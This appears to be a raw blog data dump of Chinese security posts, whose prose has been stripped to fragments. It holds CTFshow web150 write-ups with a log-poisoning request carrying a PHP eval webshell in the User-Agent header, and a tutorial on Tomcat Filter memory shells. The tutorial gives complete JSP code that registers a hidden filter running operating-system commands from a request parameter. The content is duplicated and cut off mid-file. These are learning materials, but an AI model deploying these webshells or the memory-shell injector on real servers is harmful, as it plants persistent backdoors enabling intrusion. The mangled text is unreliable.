class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">file_put_contents($_GET[&#x27;ctf&#x27;], $_POST[&#x27;show&#x27;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$files = scandir(&#x27;./&#x27;); </span><br><span class=\"line\">foreach($files as $file) &#123;</span><br><span class=\"line\">    if(is_file($file))&#123;</span><br><span class=\"line\">        if ($file !== &quot;index.php&quot;) &#123;</span><br><span class=\"line\">            unlink($file);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p></p>\n<p>index.php</p>\n<p></p>\n<p></p>\n<h3 id=\"web150\"><a href=\"#web150\" class=\"headerlink\" title=\"web150\"></a>web150</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /?isVIP=1 HTTP/1.1</span><br><span class=\"line\">Host: 76d1b363-e52c-456b-aff5-8c0c5ad8c0ad.challenge.ctf.show</span><br><span class=\"line\">User-Agent: &lt;?php eval($_POST[1]);?&gt;</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Cookie: _ga=GA1.2.1418869291.1680592508</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length: 49</span><br><span class=\"line\"></span><br><span class=\"line\">ctf=/var/log/nginx/access.log&amp;1=system(&#x27;cat f*&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"web150-plus\"><a href=\"#web150-plus\" class=\"headerlink\" title=\"web150_plus\"></a>web150_plus</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">include(&quot;flag.php&quot;);</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">highlight_file(__FILE__);</span><br><span class=\"line\"></span><br><span class=\"line\">class CTFSHOW&#123;</span><br><span class=\"line\">    private $username;</span><br><span class=\"line\">    private $password;</span><br><span class=\"line\">    private $vip;</span><br><span class=\"line\">    private $secret;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __construct()&#123;</span><br><span class=\"line\">        $this-&gt;vip = 0;</span><br><span class=\"line\">        $this-&gt;secret = $flag;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __destruct()&#123;</span><br><span class=\"line\">        echo $this-&gt;secret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function isVIP()&#123;</span><br><span class=\"line\">        return $this-&gt;vip?TRUE:FALSE;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function __autoload($class)&#123;</span><br><span class=\"line\">        if(isset($class))&#123;</span><br><span class=\"line\">            $class();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">#</span><br><span class=\"line\">$key = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class=\"line\">if(preg_match(&#x27;/\\_| |\\[|\\]|\\?/&#x27;, $key))&#123;</span><br><span class=\"line\">    die(&quot;error&quot;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ctf = $_POST[&#x27;ctf&#x27;];</span><br><span class=\"line\">extract($_GET);</span><br><span class=\"line\">if(class_exists($__CTFSHOW__))&#123;</span><br><span class=\"line\">    echo &quot;class is exists!&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE &amp;&amp; strrpos($ctf,&quot;log&quot;)===FALSE)&#123;</span><br><span class=\"line\">    include($ctf);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>log</p>\n<blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__autoload()</span><br><span class=\"line\">__autoload  </span><br><span class=\"line\">?..CTFSHOW..=phpinfophpinfo</span><br><span class=\"line\">..CTFSHOW..__CTFSHOW__CTFSHOW</span><br><span class=\"line\">__autoload()phpinfophpinfo</span><br><span class=\"line\">getshell</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p><strong>payload</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>\n\n<p>php</p>\n<hr>\n<p></p>\n"},{"title":"TomcatFilter","date":"2023-06-11T15:42:29.000Z","excerpt":"TomcatFilter","_content":"\n\n\n## Filter\n\nFilterservletservletservletFilter `web.xml`Filter\n\n\n\nFilterFilterFilterservletFilterFilterchain\n\n### demo\n\nFilterdemo\n\ntestfilter.java\n\n```auto\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class testfilter implements Filter{\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"filter\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"dofilter\");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n```\n\nweb.xml\n\n```auto\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <filter>\n        <filter-name>testfilter</filter-name>\n        <filter-class>testfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>testfilter</filter-name>\n        <url-pattern>/filter</url-pattern>\n    </filter-mapping>\n\n    <servlet>\n        <!--servlet-->\n        <servlet-name>test</servlet-name>\n        <!--class-->\n        <servlet-class>test</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>test</servlet-name>\n        <!--url-->\n        <url-pattern>/test</url-pattern>\n    </servlet-mapping>\n</web-app>\n```\n\n `/filter`\n\n\n\n\n\n### Filter\n\nfrom [https://paper.seebug.org/1441/#tomcat](https://paper.seebug.org/1441/#tomcat)\n\n+   **Filter**\n    \n    ```auto\n     Filter  Java  Filter javax.servlet.Filter init(Web  Filter  Filter  init )doFilter( Filter Servlet  Filter  doFilter )destory( Web  Filter )\n    ```\n    \n+   **FilterChain**\n    \n    ```auto\n     FilterChain  doFilter()  Filter  Filter.FilterFilterChain, FilterFilterChain\n    ```\n    \n+   **FilterConfig**\n    \n    ```auto\n    , Servlet Filter  Servlet Servlet  ServletContext  Filter  FilterConfig FilterConfig  FilterConfig  Filter  ServletContext  web.xml  Filter \n    ```\n    \n+   **FilterDef**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterChain**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterConfig**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterFactory**\n    \n    ```auto\n    \n    ```\n    \n+   **WebXml**\n    \n    ```auto\n    web.xml\n    ```\n    \n+   **ContextConfig**\n    \n    ```auto\n    web\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    web(Context)\n    ```\n    \n+   **StandardWrapperValve**\n    \n    ```auto\n    Wrapperservlet\n    \n    ```\n    \n\n### Tomcat Filter\n\n `ContextConfig$configureContext`  `web.xml`  `WebXml` \n\n\n\n `StandardWrapperValve` \n\n```auto\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n```\n\n `filterchain`  `ApplicationFilterFactory$createFilterChain` \n\n\n\n `filterchain`  `StandardWrapper$getParent`  `Context` WEB `Context`  `findFilterMaps`  `filterMaps`\n\n\n\n`filterMaps`  `filterMap`  `filterMap`  filtername  url `filter` \n\n\n\n`for`  `filterMaps`  `url`  `filterMap`  `urlPatterns`  `findFilterConfig`  `filtername`  `FilterConfig`  `addFilter`  `filterConfig`  `filterChain`\n\n `addFilter`  `filterChain`  `filter`  `return`\n\n\n\nn `filters`  `filters`  `filterChain`  `StandardWrapperValve`  `ApplicationFilterChain$doFilter`\n\n\n\n `doFilter` \n\n\n\n `internalDoFilter` \n\n\n\n `filterConfig`  `filterConfig.getFilter()`  `filter`  `filter`  `doFilter`  Filter \n\n\n\n+    `Context`  `filterMaps`\n+    `urlPattern`  url  `filtername`\n+    `filtername`  `FilterConfig`\n+    `FilterConfig`  `filterChain`\n+    `filterChain`  `internalDoFilter`  `FilterConfig`\n+    `FiletrConfig`  `Filter`  `Filter`  `doFilter`\n\n## filter\n\nfilterdemo `filter` \n\n `filter`  `filterMaps`  `context` \n\n\n\n `context`  `filterMaps`  `filter` \n\n `context`  `StandardContext`  `filter` \n\n\n\n+   filterConfigs `filterConfig`  `HashMap`  `filterConfig`  `FilterDef`  `filter` \n+   filterDefs `FilterDef`  `HashMap` **FilterDef**url \n+   filterMaps `FilterMap`  `HashMap`  `FilterMap`  `FilterName`  `URLPattern`\n\n\n\n+    `filter`\n+    `FilterDef`  `filter`\n+    `FilterDef`  `FilterDefs`  `FilterConfig`\n+    `filter`  `filterMap`  `filterMaps` ()\n\n\n\n```auto\n//filter\n        Filter filter=new Filter() {\n            @Override\n            public void init(FilterConfig filterConfig) throws ServletException {\n\n            }\n\n            @Override\n            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                HttpServletRequest req = (HttpServletRequest) servletRequest;\n                if (req.getParameter(\"cc\") != null){\n                    byte[] bytes = new byte[1024];\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n                    servletResponse.getWriter().write(new String(baos.toByteArray()));\n                    return;\n                }\n                filterChain.doFilter(servletRequest,servletResponse);\n            }\n\n            @Override\n            public void destroy() {\n\n            }\n        };\n\n        //filter\n        String filtername=\"novic4\";\n        FilterDef filterDef=new FilterDef();\n        filterDef.setFilter(filter);\n        filterDef.setFilterName(filtername);\n        filterDef.setFilterClass(filter.getClass().getName());\n\n        //filterdeffilterdefs\n        standardContext.addFilterDef(filterDef);\n\n        //filterdeffilterconfig\n        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n        constructor.setAccessible(true);\n        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n        //filterMap\n        FilterMap filterMap = new FilterMap();\n        filterMap.addURLPattern(\"/*\");\n        filterMap.setFilterName(filtername);\n        // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3\n        filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n        //filterMaps\n        standardContext.addFilterMapBefore(filterMap);\n\n        //filterconfigs\n        Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n        Configs.setAccessible(true);\n        Map filterConfigs = (Map) Configs.get(standardContext);\n        filterConfigs.put(filtername,filterConfig);\n```\n\n `context`  `context`,\n\n+   ** `servletcontext`  `StandardContext`**\n    \n    ```auto\n    webwebservletcontextweb\n    ```\n    \n    ```auto\n    ServletContext servletContext = request.getSession().getServletContext();\n        Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n        appctx.setAccessible(true);\n            // ApplicationContext  ServletContext \n        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    \n        Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n        stdctx.setAccessible(true);\n        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    ```\n    \n+   ****Mbeancontext****\n    \n    ```auto\n    [https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    [https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)\n    \n    ```\n    \n\n\n\n```auto\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.Map\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n<%@ page import=\"java.lang.reflect.Constructor\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n<%@ page import=\"org.apache.catalina.Context\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n\n<%\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //filter\n    Filter filter=new Filter() {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n            HttpServletRequest req = (HttpServletRequest) servletRequest;\n            if (req.getParameter(\"cc\") != null){\n                byte[] bytes = new byte[1024];\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                servletResponse.getWriter().write(new String(baos.toByteArray()));\n                return;\n            }\n            filterChain.doFilter(servletRequest,servletResponse);\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    };\n\n    //filter\n    String filtername=\"novic4\";\n    FilterDef filterDef=new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filtername);\n    filterDef.setFilterClass(filter.getClass().getName());\n\n    //filterdeffilterdefs\n    standardContext.addFilterDef(filterDef);\n\n    //filterdeffilterconfig\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n    //filterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filtername);\n    // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n    //filterMaps\n    standardContext.addFilterMapBefore(filterMap);\n\n    //filterconfigs\n    Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(standardContext);\n    filterConfigs.put(filtername,filterConfig);\n    out.print(\"bingo\");\n%>\n```\n\n\n\n\n\n","source":"_posts/TomcatFilter.md","raw":"---\ntitle: TomcatFilter\ndate: 2023-06-11 23:42:29\nexcerpt: TomcatFilter\ncategories: \n---\n\n\n\n## Filter\n\nFilterservletservletservletFilter `web.xml`Filter\n\n\n\nFilterFilterFilterservletFilterFilterchain\n\n### demo\n\nFilterdemo\n\ntestfilter.java\n\n```auto\nimport javax.servlet.*;\nimport java.io.IOException;\n\npublic class testfilter implements Filter{\n    @Override\n    public void init(FilterConfig filterConfig) throws ServletException {\n        System.out.println(\"filter\");\n    }\n\n    @Override\n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n        System.out.println(\"dofilter\");\n        filterChain.doFilter(servletRequest,servletResponse);\n    }\n\n    @Override\n    public void destroy() {\n\n    }\n}\n```\n\nweb.xml\n\n```auto\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n    <filter>\n        <filter-name>testfilter</filter-name>\n        <filter-class>testfilter</filter-class>\n    </filter>\n\n    <filter-mapping>\n        <filter-name>testfilter</filter-name>\n        <url-pattern>/filter</url-pattern>\n    </filter-mapping>\n\n    <servlet>\n        <!--servlet-->\n        <servlet-name>test</servlet-name>\n        <!--class-->\n        <servlet-class>test</servlet-class>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>test</servlet-name>\n        <!--url-->\n        <url-pattern>/test</url-pattern>\n    </servlet-mapping>\n</web-app>\n```\n\n `/filter`\n\n\n\n\n\n### Filter\n\nfrom [https://paper.seebug.org/1441/#tomcat](https://paper.seebug.org/1441/#tomcat)\n\n+   **Filter**\n    \n    ```auto\n     Filter  Java  Filter javax.servlet.Filter init(Web  Filter  Filter  init )doFilter( Filter Servlet  Filter  doFilter )destory( Web  Filter )\n    ```\n    \n+   **FilterChain**\n    \n    ```auto\n     FilterChain  doFilter()  Filter  Filter.FilterFilterChain, FilterFilterChain\n    ```\n    \n+   **FilterConfig**\n    \n    ```auto\n    , Servlet Filter  Servlet Servlet  ServletContext  Filter  FilterConfig FilterConfig  FilterConfig  Filter  ServletContext  web.xml  Filter \n    ```\n    \n+   **FilterDef**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterChain**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterConfig**\n    \n    ```auto\n    \n    ```\n    \n+   **ApplicationFilterFactory**\n    \n    ```auto\n    \n    ```\n    \n+   **WebXml**\n    \n    ```auto\n    web.xml\n    ```\n    \n+   **ContextConfig**\n    \n    ```auto\n    web\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    web(Context)\n    ```\n    \n+   **StandardWrapperValve**\n    \n    ```auto\n    Wrapperservlet\n    \n    ```\n    \n\n### Tomcat Filter\n\n `ContextConfig$configureContext`  `web.xml`  `WebXml` \n\n\n\n `StandardWrapperValve` \n\n```auto\nApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);\n```\n\n `filterchain`  `ApplicationFilterFactory$createFilterChain` \n\n\n\n `filterchain`  `StandardWrapper$getParent`  `Context` WEB `Context`  `findFilterMaps`  `filterMaps`\n\n\n\n`filterMaps`  `filterMap`  `filterMap`  filtername  url `filter` \n\n\n\n`for`  `filterMaps`  `url`  `filterMap`  `urlPatterns`  `findFilterConfig`  `filtername`  `FilterConfig`  `addFilter`  `filterConfig`  `filterChain`\n\n `addFilter`  `filterChain`  `filter`  `return`\n\n\n\nn `filters`  `filters`  `filterChain`  `StandardWrapperValve`  `ApplicationFilterChain$doFilter`\n\n\n\n `doFilter` \n\n\n\n `internalDoFilter` \n\n\n\n `filterConfig`  `filterConfig.getFilter()`  `filter`  `filter`  `doFilter`  Filter \n\n\n\n+    `Context`  `filterMaps`\n+    `urlPattern`  url  `filtername`\n+    `filtername`  `FilterConfig`\n+    `FilterConfig`  `filterChain`\n+    `filterChain`  `internalDoFilter`  `FilterConfig`\n+    `FiletrConfig`  `Filter`  `Filter`  `doFilter`\n\n## filter\n\nfilterdemo `filter` \n\n `filter`  `filterMaps`  `context` \n\n\n\n `context`  `filterMaps`  `filter` \n\n `context`  `StandardContext`  `filter` \n\n\n\n+   filterConfigs `filterConfig`  `HashMap`  `filterConfig`  `FilterDef`  `filter` \n+   filterDefs `FilterDef`  `HashMap` **FilterDef**url \n+   filterMaps `FilterMap`  `HashMap`  `FilterMap`  `FilterName`  `URLPattern`\n\n\n\n+    `filter`\n+    `FilterDef`  `filter`\n+    `FilterDef`  `FilterDefs`  `FilterConfig`\n+    `filter`  `filterMap`  `filterMaps` ()\n\n\n\n```auto\n//filter\n        Filter filter=new Filter() {\n            @Override\n            public void init(FilterConfig filterConfig) throws ServletException {\n\n            }\n\n            @Override\n            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n                HttpServletRequest req = (HttpServletRequest) servletRequest;\n                if (req.getParameter(\"cc\") != null){\n                    byte[] bytes = new byte[1024];\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n                    servletResponse.getWriter().write(new String(baos.toByteArray()));\n                    return;\n                }\n                filterChain.doFilter(servletRequest,servletResponse);\n            }\n\n            @Override\n            public void destroy() {\n\n            }\n        };\n\n        //filter\n        String filtername=\"novic4\";\n        FilterDef filterDef=new FilterDef();\n        filterDef.setFilter(filter);\n        filterDef.setFilterName(filtername);\n        filterDef.setFilterClass(filter.getClass().getName());\n\n        //filterdeffilterdefs\n        standardContext.addFilterDef(filterDef);\n\n        //filterdeffilterconfig\n        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n        constructor.setAccessible(true);\n        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n        //filterMap\n        FilterMap filterMap = new FilterMap();\n        filterMap.addURLPattern(\"/*\");\n        filterMap.setFilterName(filtername);\n        // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3\n        filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n        //filterMaps\n        standardContext.addFilterMapBefore(filterMap);\n\n        //filterconfigs\n        Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n        Configs.setAccessible(true);\n        Map filterConfigs = (Map) Configs.get(standardContext);\n        filterConfigs.put(filtername,filterConfig);\n```\n\n `context`  `context`,\n\n+   ** `servletcontext`  `StandardContext`**\n    \n    ```auto\n    webwebservletcontextweb\n    ```\n    \n    ```auto\n    ServletContext servletContext = request.getSession().getServletContext();\n        Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n        appctx.setAccessible(true);\n            // ApplicationContext  ServletContext \n        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n    \n        Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n        stdctx.setAccessible(true);\n        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n    ```\n    \n+   ****Mbeancontext****\n    \n    ```auto\n    [https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)\n    ```\n    \n+   **StandardContext**\n    \n    ```auto\n    